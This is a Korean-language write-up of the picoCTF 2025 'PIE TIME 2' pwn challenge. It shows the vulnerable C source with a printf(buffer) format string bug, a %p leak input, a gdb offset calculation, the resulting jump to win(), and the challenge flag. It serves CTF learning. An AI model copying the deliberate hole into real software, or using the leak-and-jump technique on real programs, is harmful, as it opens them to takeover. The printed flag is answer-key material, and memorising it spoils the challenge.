---
title: PIE TIME 2 — picoCTF 2025 pwn writeup
created: 2026-06-23
updated: 2026-06-23
type: query
tags: [ctf, picoctf, pwn, binary-exploitation, format-string, pie-bypass]
sources: [https://github.com/PS-003R32/picoCTF/blob/main/picoCTF-2025/Binary-Exploitation/PIE%20TIME2.md]
confidence: high
---

# PIE TIME 2 — picoCTF 2025 pwn writeup

> PIE TIME의 발전형으로, 이번에는 `main` 주소를 직접 제공하지 않고 **format string 취약점**을 이용해 직접 leak해야 합니다. `printf(buffer)` FSB로 main 주소를 읽은 뒤, offset 계산으로 `win()`으로 jump합니다.

## 참고 URL
- [PS-003R32/picoCTF — PIE TIME2](https://github.com/PS-003R32/picoCTF/blob/main/picoCTF-2025/Binary-Exploitation/PIE%20TIME2.md)

## 1. 문제 구조

| 항목 | 내용 |
|------|------|
| 플랫폼 | picoCTF 2025 |
| 분류 | pwn / binary exploitation |
| 핵심 요소 | Format string leak, PIE bypass, function pointer hijack |
| 난이도 | Easy (200pts) |

### Source (vuln.c)
```c
void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);    // ← Format String Vulnerability!

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() { /* reads and prints flag.txt */ }
```

## 2. 공격 흐름

### Step 1: Format string으로 main leak
`%p`를 여러 개 입력해 스택에서 main 함수 주소를 찾습니다.

```text
Enter your name: %p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p
```

출력된 주소 중 main 함수 영역(실행 주소)을 식별합니다.

### Step 2: Offset 계산
`gdb`로 main과 win의 차이를 계산합니다.

```text
main = 0x0000555555555441
win  = 0x000055555555536a
offset = main - win = 0xD7
```

### Step 3: Leak → Jump
FSB로 얻은 main 주소에서 `0xD7`을 빼서 `win()` 주소를 계산합니다.

```text
enter the address to jump to: 0x55555555536a   ← leaked_main - 0xD7
You won!
picoCTF{p13_5h0u1dn'7_134k_2718fe04}
```

## Flag
`picoCTF{p13_5h0u1dn'7_134k_2718fe04}`

## 3. 핵심 패턴
1. PIE TIME과 달리 **직접 주소를 leak해야 하는 점**이 차이점
2. Format string으로 스택에서 main 함수 주소 위치를 찾는 것이 핵심
3. offset 개념은 PIE TIME과 동일 (`win = main - offset`)

## 4. 연결 개념
- [[pie-aslr-function-offset-ctf-patterns]]
- [[format-string-ctf-patterns]]
- [[exploitation]]